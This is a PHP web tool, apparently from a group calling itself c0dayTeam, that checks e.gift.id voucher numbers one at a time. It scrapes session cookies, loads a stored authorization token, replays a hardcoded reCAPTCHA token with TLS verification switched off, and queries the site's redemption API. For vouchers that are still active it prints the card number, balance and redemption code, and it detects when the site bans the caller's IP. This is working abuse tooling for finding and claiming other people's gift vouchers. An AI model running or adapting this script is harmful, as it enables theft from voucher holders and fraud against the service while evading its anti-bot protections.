<?php
// c0dayTeam - @RiyanCoday //
error_reporting(0);
if(isset($_POST[s])){
$s = $_POST[s];
$type = $_POST[type];
	if($type == 1){
		$type = 8346;
	}else{
		$type = 1662;
	}
	
function cdy($url,$headers, $post_fields = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($post_fields && !empty($post_fields)) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
if(isset($headers)){
	    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_HEADER, 0);
}else{
			curl_setopt($ch, CURLOPT_HEADER, 1);
}
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $data = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);
    return $data;
}
$result = cdy("https://e.gift.id/u/83nuww9792646");
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
if(isset($matches[1][0])){
	$headers = array();
	$auth = file('auth-c.txt'); 
$headers[] = "Authorization: ".$auth[0]."";
$headers[] = "Content-type: application/json;charset=UTF-8";
$headers[] = "Origin: https://e.gift.id";
$headers[] = "Referer: https://e.gift.id/u/16autujvv4y62";
$headers[] = "Cookie: ".$matches[1][0]."; ".$matches[1][1]."; ".$matches[1][2]."; ";
$url = "https://e.gift.id/api/egifts/redemption_external/".$type."/".$s."";
$post_fields = '{"terminalId":"external","recaptchaToken":"03ADlfD1_uUVg9HvbFk0oVYTyaiMDsm6bVvc2nTHdiskPC8uEp1ywxpm3kNmZh0NsMIklnp3-o_IOTNpuhcWVb_xk_H1DLKUGKOHdGxPCbShHGEJx_5KM-gvoJHTMS884byybnAXHfFyfodJ7p3ydBIfSUrTitye0A9SpwP8b-0F5gxgwa07OZz_CMgRDXTNniQG-THHsb4xpDHAmANLL6Sgf1yGRwbfAE8-XDgpfqhlXBpbLzFnBu8OE8xJmy9F07_lUibwDFjFgDgF_dEd4L3DQWsSorgiZo7g"}';
$dat = cdy($url, $headers, $post_fields);
print_r($dat);
echo "<hr>";
$c = json_decode($dat);
//echo $c->message;
if (stripos($dat, 'has banned your IP address')) {
		echo'BANNED IP => Num: '.$s.' ['.$type.']';
}elseif($c->body->message == "eVoucher is already used"){
	echo 'Sudah diClaim => Num: '.$s.' <a href="https://e.gift.id/r/'.$type.'/'.$s.'">LINK</a>';
}elseif($c->body->replyCardStatus == "active"){
		echo 'Belum diClaim => Num: '.$c->body->replyCardNo.' | Rp.'.$c->body->replyCardBalance.' | Code: '.$c->body->external_number->number.' <a href="https://e.gift.id/r/'.$type.'/'.$s.'">LINK</a>';
}elseif($c->body->message == "eVoucher not found or expired"){
		echo 'Sudah Mati/Voucher tidak ada => Num: '.$s.' ['.$type.']';
}else{
	echo'Error => Num: '.$s.'';
}
}
}
?>
<form method=post>
<input type=text name=s>
  <input type="radio" name="type" value="1" checked> 1
  <input type="radio" name="type" value="2"> 2<br>
  <button>Check</button>
</form>